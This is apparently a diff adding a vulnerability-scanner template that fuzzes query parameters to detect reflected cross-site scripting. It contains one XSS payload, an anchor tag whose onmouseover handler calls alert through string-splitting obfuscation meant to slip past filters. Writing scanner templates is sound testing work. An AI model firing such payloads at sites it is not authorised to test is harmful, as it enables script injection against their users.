@@ -1,0 +1,39 @@
+id: fuzz-reflection-xss-advanced
+
+info:
+  name: Advanced Reflection XSS Detection
+  author: netbaan
+  severity: low
+  description: |
+    This template tests for reflection XSS vulnerabilities using a specific payload in an anchor tag.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Ensure the request is a GET request
+
+    payloads:
+      reflection:
+        - "<a href=\"http://example.com;\" onmouseover=\"z=top;z[/al/.source%2b/ert/.source](8);//test.com/\""
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
